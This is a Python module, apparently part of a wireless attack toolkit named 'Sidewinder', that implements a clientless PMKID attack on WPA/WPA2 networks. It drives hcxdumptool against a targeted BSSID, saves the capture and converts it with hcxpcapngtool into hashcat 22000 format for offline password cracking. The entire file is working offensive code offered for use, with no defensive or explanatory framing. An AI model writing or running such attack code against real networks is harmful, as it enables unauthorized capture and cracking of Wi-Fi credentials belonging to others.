"""Sidewinder PMKID Attack Module.

Implements clientless WPA/WPA2 handshake capture using hcxdumptool.
"""
import asyncio
import logging
import os
from typing import Any, Tuple

from ..core.attack import BaseAttackEngine, AttackConfig, AttackResult, AttackState
from ..core.subprocess_mgr import SubprocessManager

logger = logging.getLogger(__name__)


class PMKIDEngine(BaseAttackEngine):
    """Engine for capturing PMKID hashes via hcxdumptool."""

    def __init__(self, mgr: SubprocessManager) -> None:
        super().__init__()
        self.mgr = mgr
        self._proc_id: str = ""

    async def start(self, config: AttackConfig, **kwargs: Any) -> AttackResult:
        """Launch hcxdumptool to capture PMKID."""
        iface = kwargs.get("iface")
        if not iface:
            return AttackResult(False, ["No interface provided for PMKID attack."])

        capture_file = os.path.expanduser(f"~/.sidewinder/captures/pmkid_{config.target_bssid.replace(':', '')}.pcapng")
        os.makedirs(os.path.dirname(capture_file), exist_ok=True)

        self.state = AttackState.RUNNING

        # Run hcxdumptool
        # -i interface
        # -o output file
        # --filterlist_ap=target_bssid (requires creating a filter file)
        
        filter_file = f"/tmp/sidewinder_filter_{config.target_bssid.replace(':', '')}.txt"
        try:
            with open(filter_file, "w") as f:
                f.write(config.target_bssid.replace(":", "") + "\n")

            cmd = [
                "hcxdumptool",
                "-i", iface,
                "-o", capture_file,
                "--filterlist_ap", filter_file,
                "--filtermode", "2",  # Only target APs in list
                "--enable_status", "1"
            ]

            logger.info("Starting PMKID attack on %s (BSSID: %s)", iface, config.target_bssid)
            await self._emit_progress(status="Starting hcxdumptool...")

            self._proc_id = await self.mgr.start_background(cmd)

            # Wait for timeout
            try:
                for i in range(int(config.timeout)):
                    if self.state != AttackState.RUNNING:
                        break
                    await asyncio.sleep(1)
                    await self._emit_progress(status=f"Capturing PMKID... ({i}/{int(config.timeout)}s)")
            except asyncio.CancelledError:
                pass

            await self.stop()

            # Convert pcapng to hashcat format (22000)
            hash_file = capture_file.replace(".pcapng", ".hc22000")
            await self._emit_progress(status="Converting capture to hashcat format...")

            conv_result = await self.mgr.run(["hcxpcapngtool", "-o", hash_file, capture_file])

            success = os.path.exists(hash_file) and os.path.getsize(hash_file) > 0

            return AttackResult(
                success=success,
                stats={"hash_file": hash_file if success else None}
            )
        finally:
            if os.path.exists(filter_file):
                os.remove(filter_file)

    async def stop(self) -> None:
        """Stop the attack."""
        if self._proc_id:
            await self.mgr.kill_background(self._proc_id)
            self._proc_id = ""
        self.state = AttackState.COMPLETED
